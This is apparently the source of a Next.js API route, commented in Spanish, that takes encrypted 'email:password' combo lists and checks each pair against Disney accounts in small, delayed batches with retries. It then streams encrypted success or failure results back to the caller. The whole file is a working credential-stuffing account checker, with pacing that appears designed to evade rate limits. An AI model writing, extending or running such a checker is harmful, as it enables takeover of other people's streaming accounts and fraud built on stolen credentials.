import { NextResponse } from 'next/server';
import { DisneyAPI } from '../../../utils/disney/disneyApi';
import { encrypt, decrypt } from '../../../utils/encryption';

const BATCH_SIZE = 2; // Tamaño del lote
const MAX_RETRIES = 3; // Número máximo de reintentos por lote
const RETRY_DELAY = 2000; // Tiempo de espera entre reintentos (2 segundos)
const BATCH_DELAY = 3000; // Tiempo de espera entre lotes (3 segundos)

async function sleep(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function processWithRetry(
  accountObjects: { email: string; password: string }[],
  maxRetries: number = MAX_RETRIES
): Promise<any[]> {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const results = await DisneyAPI.checkBatch(accountObjects);
      return results;
    } catch (error) {
      console.error(`Intento ${attempt + 1}/${maxRetries} falló:`, error);
      if (attempt < maxRetries - 1) {
        await sleep(RETRY_DELAY);
      } else {
        throw error;
      }
    }
  }
  throw new Error('Máximo número de reintentos alcanzado');
}

export async function POST(request: Request) {
  try {
    const encryptedData = await request.text();
    console.log('📦 Datos encriptados recibidos');
    
    let accounts: string[];
    try {
      const decryptedData = decrypt(encryptedData);
      console.log('🔓 Datos desencriptados');
      accounts = JSON.parse(decryptedData);
    } catch (error) {
      throw new Error('Error al desencriptar los datos');
    }

    const stream = new TransformStream();
    const writer = stream.writable.getWriter();

    const sendResult = async (result: any) => {
      try {
        const encryptedResult = encrypt(JSON.stringify({ result }));
        await writer.write(new TextEncoder().encode(`data: ${encryptedResult}\n\n`));
      } catch (error) {
        console.error('Error al enviar resultado:', error);
      }
    };

    let processedAccounts = new Set<string>();

    (async () => {
      try {
        // Procesar las cuentas en lotes pequeños
        for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
          // Verificar si ya procesamos todas las cuentas
          if (processedAccounts.size >= accounts.length) {
            break;
          }

          const batchAccounts = accounts
            .slice(i, i + BATCH_SIZE)
            .filter(account => !processedAccounts.has(account));

          if (batchAccounts.length === 0) continue;
          
          // Convertir y validar las cuentas del lote
          const accountObjects = batchAccounts
            .map(account => {
              const [email, password] = account.split(':');
              return email && password ? { email, password } : null;
            })
            .filter((account): account is { email: string; password: string } => account !== null);

          if (accountObjects.length === 0) continue;

          // Procesar el lote actual con reintentos
          try {
            console.log(`Procesando lote ${i / BATCH_SIZE + 1}, cuentas:`, batchAccounts);
            const results = await processWithRetry(accountObjects);
            
            // Enviar resultados del lote
            for (let j = 0; j < results.length; j++) {
              await sendResult({
                account: batchAccounts[j],
                ...results[j]
              });
              processedAccounts.add(batchAccounts[j]);
            }

            // Pausa entre lotes
            if (i + BATCH_SIZE < accounts.length) {
              console.log(`Esperando ${BATCH_DELAY}ms antes del siguiente lote...`);
              await sleep(BATCH_DELAY);
            }
          } catch (batchError) {
            console.error('Error procesando lote:', batchError);
            // Enviar resultados de error para las cuentas del lote
            for (const account of batchAccounts) {
              if (!processedAccounts.has(account)) {
                await sendResult({
                  account,
                  success: false,
                  error: 'Error al verificar la cuenta'
                });
                processedAccounts.add(account);
              }
            }
            // Pausa adicional después de un error
            await sleep(RETRY_DELAY);
          }
        }

        // Verificar si quedaron cuentas sin procesar
        const unprocessedAccounts = accounts.filter(account => !processedAccounts.has(account));
        if (unprocessedAccounts.length > 0) {
          console.log('Reintentando cuentas no procesadas:', unprocessedAccounts);
          // Reintentar las cuentas no procesadas
          for (const account of unprocessedAccounts) {
            const [email, password] = account.split(':');
            if (email && password) {
              try {
                const result = await processWithRetry([{ email, password }]);
                await sendResult({
                  account,
                  ...result[0]
                });
              } catch (error) {
                await sendResult({
                  account,
                  success: false,
                  error: 'Error al verificar la cuenta después de reintentos'
                });
              }
              await sleep(RETRY_DELAY);
            }
          }
        }
      } catch (error) {
        console.error('Error en el stream:', error);
      } finally {
        await writer.close();
      }
    })();

    return new Response(stream.readable, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
      }
    });
  } catch (error: any) {
    const errorResponse = encrypt(JSON.stringify({ 
      error: `Error al procesar la solicitud: ${error.message}` 
    }));
    
    return new Response(errorResponse, {
      status: 500,
      headers: { 'Content-Type': 'text/plain' }
    });
  }
} 